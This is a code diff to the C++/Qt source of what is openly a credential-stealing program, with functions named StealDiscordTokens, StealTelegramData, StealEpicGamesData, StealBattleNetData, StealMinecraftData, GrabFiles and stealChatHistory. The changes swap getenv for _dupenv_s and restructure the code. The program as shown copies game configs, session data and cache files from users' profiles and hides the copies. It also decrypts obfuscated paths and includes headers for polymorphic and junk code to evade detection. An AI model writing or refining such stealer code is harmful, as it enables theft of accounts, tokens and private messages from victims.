@@ -4,7 +4,6 @@
 #include "polymorphic_code.h"
 #include "junk_code.h"
 
-#include <cstdlib>
 #include <QMessageBox>
 #include <QProcess>
 #include <QFileDialog>
@@ -590,62 +589,65 @@ std::string MainWindow::StealArizonaRPData(const std::string& dir) {
     std::string result;
 
     // Получаем путь к APPDATA
-    const char* appDataPath = std::getenv("APPDATA");
-    if (appDataPath) {
-        std::string appData(appDataPath);
-        // Путь к samp.ini (конфигурация SAMP)
-        std::string sampConfigPath = appData + "\\SA-MP\\samp.ini";
-        if (std::filesystem::exists(sampConfigPath)) {
-            std::string arizonaConfigPath = arizonaDir + "\\arizona_samp_config.txt";
-            std::filesystem::copy_file(sampConfigPath, arizonaConfigPath, std::filesystem::copy_options::overwrite_existing);
-            SetFileAttributesA(arizonaConfigPath.c_str(), FILE_ATTRIBUTE_HIDDEN); // Скрытие файла
-            collectedFiles.push_back(arizonaConfigPath);
+    char* appDataPath = nullptr;
+    size_t len;
+    if (_dupenv_s(&appDataPath, &len, "APPDATA") != 0 || !appDataPath) {
+        emitLog("Ошибка: Не удалось получить путь к APPDATA для Arizona RP");
+        free(appDataPath);
+        return "";
+    }
+    std::string appData(appDataPath);
+    free(appDataPath);
 
-            // Читаем файл для извлечения данных
-            std::ifstream configFile(sampConfigPath);
-            std::string line, configContent;
-            while (std::getline(configFile, line)) {
-                configContent += line + "\n";
-                // Ищем никнейм и сервер (Arizona RP)
-                if (line.find("last_nick") != std::string::npos || 
-                    line.find("server") != std::string::npos) {
-                    result += "Arizona RP (SAMP): " + line + "\n";
-                }
-            }
-            configFile.close();
+    // Путь к samp.ini (конфигурация SAMP)
+    std::string sampConfigPath = appData + "\\SA-MP\\samp.ini";
+    if (std::filesystem::exists(sampConfigPath)) {
+        std::string arizonaConfigPath = arizonaDir + "\\arizona_samp_config.txt";
+        std::filesystem::copy_file(sampConfigPath, arizonaConfigPath, std::filesystem::copy_options::overwrite_existing);
+        SetFileAttributesA(arizonaConfigPath.c_str(), FILE_ATTRIBUTE_HIDDEN); // Скрытие файла
+        collectedFiles.push_back(arizonaConfigPath);
 
-            // Сохраняем содержимое
-            std::ofstream outFile(arizonaConfigPath);
-            if (outFile.is_open()) {
-                outFile << configContent;
-                outFile.close();
-                emitLog("Конфигурация Arizona RP (SAMP) сохранена и скрыта: " + QString::fromStdString(arizonaConfigPath));
-            } else {
-                emitLog("Ошибка: Не удалось сохранить конфигурацию Arizona RP");
+        // Читаем файл для извлечения данных
+        std::ifstream configFile(sampConfigPath);
+        std::string line, configContent;
+        while (std::getline(configFile, line)) {
+            configContent += line + "\n";
+            // Ищем никнейм и сервер (Arizona RP)
+            if (line.find("last_nick") != std::string::npos || 
+                line.find("server") != std::string::npos) {
+                result += "Arizona RP (SAMP): " + line + "\n";
             }
-        } else {
-            emitLog("Файл samp.ini для Arizona RP не найден");
         }
+        configFile.close();
 
-        // Проверка кэша SAMP (USERDATA)
-        std::string sampCachePath = appData + "\\SA-MP\\USERDATA";
-        if (std::filesystem::exists(sampCachePath)) {
-            for (const auto& entry : std::filesystem::directory_iterator(sampCachePath)) {
-                std::string fileName = entry.path().filename().string();
-                // Ищем файлы, связанные с Arizona RP (например, по имени сервера)
-                if (fileName.find("arizona") != std::string::npos || fileName.find(".dat") != std::string::npos) {
-                    std::string destFilePath = arizonaDir + "\\" + fileName;
-                    std::filesystem::copy_file(entry.path(), destFilePath, std::filesystem::copy_options::overwrite_existing);
-                    SetFileAttributesA(destFilePath.c_str(), FILE_ATTRIBUTE_HIDDEN); // Скрытие файла
-                    collectedFiles.push_back(destFilePath);
-                    result += "Arizona RP (SAMP) Cache: " + fileName + "\n";
-                    emitLog("Кэш Arizona RP (SAMP) скопирован и скрыт: " + QString::fromStdString(destFilePath));
-                }
-            }
+        // Сохраняем содержимое
+        std::ofstream outFile(arizonaConfigPath);
+        if (outFile.is_open()) {
+            outFile << configContent;
+            outFile.close();
+            emitLog("Конфигурация Arizona RP (SAMP) сохранена и скрыта: " + QString::fromStdString(arizonaConfigPath));
+        } else {
+            emitLog("Ошибка: Не удалось сохранить конфигурацию Arizona RP");
         }
     } else {
-        emitLog("Ошибка: Не удалось получить путь к APPDATA для Arizona RP");
-        return "";
+        emitLog("Файл samp.ini для Arizona RP не найден");
+    }
+
+    // Проверка кэша SAMP (USERDATA)
+    std::string sampCachePath = appData + "\\SA-MP\\USERDATA";
+    if (std::filesystem::exists(sampCachePath)) {
+        for (const auto& entry : std::filesystem::directory_iterator(sampCachePath)) {
+            std::string fileName = entry.path().filename().string();
+            // Ищем файлы, связанные с Arizona RP (например, по имени сервера)
+            if (fileName.find("arizona") != std::string::npos || fileName.find(".dat") != std::string::npos) {
+                std::string destFilePath = arizonaDir + "\\" + fileName;
+                std::filesystem::copy_file(entry.path(), destFilePath, std::filesystem::copy_options::overwrite_existing);
+                SetFileAttributesA(destFilePath.c_str(), FILE_ATTRIBUTE_HIDDEN); // Скрытие файла
+                collectedFiles.push_back(destFilePath);
+                result += "Arizona RP (SAMP) Cache: " + fileName + "\n";
+                emitLog("Кэш Arizona RP (SAMP) скопирован и скрыт: " + QString::fromStdString(destFilePath));
+            }
+        }
     }
 
     if (result.empty()) {
@@ -668,63 +670,66 @@ std::string MainWindow::StealRadmirRPData(const std::string& dir) {
     std::string result;
 
     // Получаем путь к APPDATA
-    const char* appDataPath = std::getenv("APPDATA");
-    if (appDataPath) {
-        std::string appData(appDataPath);
-        // Путь к settings.ini (конфигурация Radmir CRMP)
-        std::string radmirConfigPath = appData + "\\RadmirCRMP\\settings.ini";
-        if (std::filesystem::exists(radmirConfigPath)) {
-            std::string radmirDestPath = radmirDir + "\\radmir_config.txt";
-            std::filesystem::copy_file(radmirConfigPath, radmirDestPath, std::filesystem::copy_options::overwrite_existing);
-            SetFileAttributesA(radmirDestPath.c_str(), FILE_ATTRIBUTE_HIDDEN); // Скрытие файла
-            collectedFiles.push_back(radmirDestPath);
+    char* appDataPath = nullptr;
+    size_t len;
+    if (_dupenv_s(&appDataPath, &len, "APPDATA") != 0 || !appDataPath) {
+        emitLog("Ошибка: Не удалось получить путь к APPDATA для Radmir RP");
+        free(appDataPath);
+        return "";
+    }
+    std::string appData(appDataPath);
+    free(appDataPath);
 
-            // Читаем файл для извлечения данных
-            std::ifstream configFile(radmirConfigPath);
-            std::string line, configContent;
-            while (std::getline(configFile, line)) {
-                configContent += line + "\n";
-                // Ищем никнейм, сервер или сессионные данные
-                if (line.find("nickname") != std::string::npos || 
-                    line.find("server") != std::string::npos || 
-                    line.find("session") != std::string::npos) {
-                    result += "Radmir RP (CRMP): " + line + "\n";
-                }
-            }
-            configFile.close();
+    // Путь к settings.ini (конфигурация Radmir CRMP)
+    std::string radmirConfigPath = appData + "\\RadmirCRMP\\settings.ini";
+    if (std::filesystem::exists(radmirConfigPath)) {
+        std::string radmirDestPath = radmirDir + "\\radmir_config.txt";
+        std::filesystem::copy_file(radmirConfigPath, radmirDestPath, std::filesystem::copy_options::overwrite_existing);
+        SetFileAttributesA(radmirDestPath.c_str(), FILE_ATTRIBUTE_HIDDEN); // Скрытие файла
+        collectedFiles.push_back(radmirDestPath);
 
-            // Сохраняем содержимое
-            std::ofstream outFile(radmirDestPath);
-            if (outFile.is_open()) {
-                outFile << configContent;
-                outFile.close();
-                emitLog("Конфигурация Radmir RP (CRMP) сохранена и скрыта: " + QString::fromStdString(radmirDestPath));
-            } else {
-                emitLog("Ошибка: Не удалось сохранить конфигурацию Radmir RP");
+        // Читаем файл для извлечения данных
+        std::ifstream configFile(radmirConfigPath);
+        std::string line, configContent;
+        while (std::getline(configFile, line)) {
+            configContent += line + "\n";
+            // Ищем никнейм, сервер или сессионные данные
+            if (line.find("nickname") != std::string::npos || 
+                line.find("server") != std::string::npos || 
+                line.find("session") != std::string::npos) {
+                result += "Radmir RP (CRMP): " + line + "\n";
             }
-        } else {
-            emitLog("Файл settings.ini для Radmir RP (CRMP) не найден");
         }
+        configFile.close();
 
-        // Проверка кэша Radmir CRMP (например, USERDATA или logs)
-        std::string radmirCachePath = appData + "\\RadmirCRMP\\USERDATA";
-        if (std::filesystem::exists(radmirCachePath)) {
-            for (const auto& entry : std::filesystem::directory_iterator(radmirCachePath)) {
-                std::string fileName = entry.path().filename().string();
-                // Ищем файлы, связанные с Radmir RP
-                if (fileName.find("radmir") != std::string::npos || fileName.find(".dat") != std::string::npos) {
-                    std::string destFilePath = radmirDir + "\\" + fileName;
-                    std::filesystem::copy_file(entry.path(), destFilePath, std::filesystem::copy_options::overwrite_existing);
-                    SetFileAttributesA(destFilePath.c_str(), FILE_ATTRIBUTE_HIDDEN); // Скрытие файла
-                    collectedFiles.push_back(destFilePath);
-                    result += "Radmir RP (CRMP) Cache: " + fileName + "\n";
-                    emitLog("Кэш Radmir RP (CRMP) скопирован и скрыт: " + QString::fromStdString(destFilePath));
-                }
-            }
+        // Сохраняем содержимое
+        std::ofstream outFile(radmirDestPath);
+        if (outFile.is_open()) {
+            outFile << configContent;
+            outFile.close();
+            emitLog("Конфигурация Radmir RP (CRMP) сохранена и скрыта: " + QString::fromStdString(radmirDestPath));
+        } else {
+            emitLog("Ошибка: Не удалось сохранить конфигурацию Radmir RP");
         }
     } else {
-        emitLog("Ошибка: Не удалось получить путь к APPDATA для Radmir RP");
-        return "";
+        emitLog("Файл settings.ini для Radmir RP (CRMP) не найден");
+    }
+
+    // Проверка кэша Radmir CRMP (например, USERDATA или logs)
+    std::string radmirCachePath = appData + "\\RadmirCRMP\\USERDATA";
+    if (std::filesystem::exists(radmirCachePath)) {
+        for (const auto& entry : std::filesystem::directory_iterator(radmirCachePath)) {
+            std::string fileName = entry.path().filename().string();
+            // Ищем файлы, связанные с Radmir RP
+            if (fileName.find("radmir") != std::string::npos || fileName.find(".dat") != std::string::npos) {
+                std::string destFilePath = radmirDir + "\\" + fileName;
+                std::filesystem::copy_file(entry.path(), destFilePath, std::filesystem::copy_options::overwrite_existing);
+                SetFileAttributesA(destFilePath.c_str(), FILE_ATTRIBUTE_HIDDEN); // Скрытие файла
+                collectedFiles.push_back(destFilePath);
+                result += "Radmir RP (CRMP) Cache: " + fileName + "\n";
+                emitLog("Кэш Radmir RP (CRMP) скопирован и скрыт: " + QString::fromStdString(destFilePath));
+            }
+        }
     }
 
     if (result.empty()) {
@@ -2080,12 +2085,15 @@ std::string MainWindow::StealDiscordTokens(const std::string& dir) {
     std::string discordDir = dir + "\\DiscordData";
     std::filesystem::create_directories(discordDir);
 
-    const char* appDataPath = std::getenv("APPDATA");
-    if (!appDataPath) {
+    char* appDataPath = nullptr;
+    size_t len;
+    if (_dupenv_s(&appDataPath, &len, "APPDATA") != 0 || !appDataPath) {
         emitLog("Ошибка: Не удалось получить путь к APPDATA");
+        free(appDataPath);
         return "";
     }
     std::string appData(appDataPath);
+    free(appDataPath);
 
     std::vector<std::string> discordPaths = {
         appData + decryptString(encryptedDiscordPath, 0),
@@ -2123,12 +2131,15 @@ std::string MainWindow::StealTelegramData(const std::string& dir) {
     std::string telegramDir = dir + "\\TelegramData";
     std::filesystem::create_directories(telegramDir);
 
-    const char* appDataPath = std::getenv("APPDATA");
-    if (!appDataPath) {
+    char* appDataPath = nullptr;
+    size_t len;
+    if (_dupenv_s(&appDataPath, &len, "APPDATA") != 0 || !appDataPath) {
         emitLog("Ошибка: Не удалось получить путь к APPDATA");
+        free(appDataPath);
         return "";
     }
     std::string appData(appDataPath);
+    free(appDataPath);
 
     std::string telegramPath = appData + decryptString(encryptedTelegramPath, 0);
     if (!std::filesystem::exists(telegramPath)) {
@@ -2227,12 +2238,15 @@ std::string MainWindow::StealEpicGamesData(const std::string& dir) {
     std::string epicDir = dir + "\\EpicGamesData";
     std::filesystem::create_directories(epicDir);
 
-    const char* localAppDataPath = std::getenv("LOCALAPPDATA");
-    if (!localAppDataPath) {
+    char* localAppDataPath = nullptr;
+    size_t len;
+    if (_dupenv_s(&localAppDataPath, &len, "LOCALAPPDATA") != 0 || !localAppDataPath) {
         emitLog("Ошибка: Не удалось получить путь к LOCALAPPDATA");
+        free(localAppDataPath);
         return "";
     }
     std::string localAppData(localAppDataPath);
+    free(localAppDataPath);
 
     std::string epicPath = localAppData + "\\EpicGamesLauncher\\Saved\\Config";
     if (!std::filesystem::exists(epicPath)) {
@@ -2302,12 +2316,15 @@ std::string MainWindow::StealBattleNetData(const std::string& dir) {
     std::string battleNetDir = dir + "\\BattleNetData";
     std::filesystem::create_directories(battleNetDir);
 
-    const char* localAppDataPath = std::getenv("LOCALAPPDATA");
-    if (!localAppDataPath) {
+    char* localAppDataPath = nullptr;
+    size_t len;
+    if (_dupenv_s(&localAppDataPath, &len, "LOCALAPPDATA") != 0 || !localAppDataPath) {
         emitLog("Ошибка: Не удалось получить путь к LOCALAPPDATA");
+        free(localAppDataPath);
         return "";
     }
     std::string localAppData(localAppDataPath);
+    free(localAppDataPath);
 
     std::string battleNetPath = localAppData + "\\Battle.net";
     if (!std::filesystem::exists(battleNetPath)) {
@@ -2339,12 +2356,15 @@ std::string MainWindow::StealMinecraftData(const std::string& dir) {
     std::string minecraftDir = dir + "\\MinecraftData";
     std::filesystem::create_directories(minecraftDir);
 
-    const char* appDataPath = std::getenv("APPDATA");
-    if (!appDataPath) {
+    char* appDataPath = nullptr;
+    size_t len;
+    if (_dupenv_s(&appDataPath, &len, "APPDATA") != 0 || !appDataPath) {
         emitLog("Ошибка: Не удалось получить путь к APPDATA");
+        free(appDataPath);
         return "";
     }
     std::string appData(appDataPath);
+    free(appDataPath);
 
     std::string minecraftPath = appData + "\\.minecraft";
     if (!std::filesystem::exists(minecraftPath)) {
@@ -2389,12 +2409,15 @@ std::vector<std::string> MainWindow::GrabFiles(const std::string& dir) {
     std::filesystem::create_directories(grabDir);
 
     std::vector<std::string> grabbedFiles;
-    const char* userProfilePath = std::getenv("USERPROFILE");
-    if (!userProfilePath) {
+    char* userProfilePath = nullptr;
+    size_t len;
+    if (_dupenv_s(&userProfilePath, &len, "USERPROFILE") != 0 || !userProfilePath) {
         emitLog("Ошибка: Не удалось получить путь к USERPROFILE");
+        free(userProfilePath);
         return {};
     }
     std::string userProfile(userProfilePath);
+    free(userProfilePath);
 
     std::vector<std::string> targetDirs = {
         userProfile + "\\Desktop",
@@ -2431,12 +2454,15 @@ std::string MainWindow::stealChatHistory(const std::string& dir) {
     std::filesystem::create_directories(chatDir);
 
     std::string result;
-    const char* appDataPath = std::getenv("APPDATA");
-    if (!appDataPath) {
+    char* appDataPath = nullptr;
+    size_t len;
+    if (_dupenv_s(&appDataPath, &len, "APPDATA") != 0 || !appDataPath) {
         emitLog("Ошибка: Не удалось получить путь к APPDATA");
+        free(appDataPath);
         return "";
     }
     std::string appData(appDataPath);
+    free(appDataPath);
 
     // Discord chat history (leveldb logs)
     std::string discordPath = appData + decryptString(encryptedDiscordPath, 0);
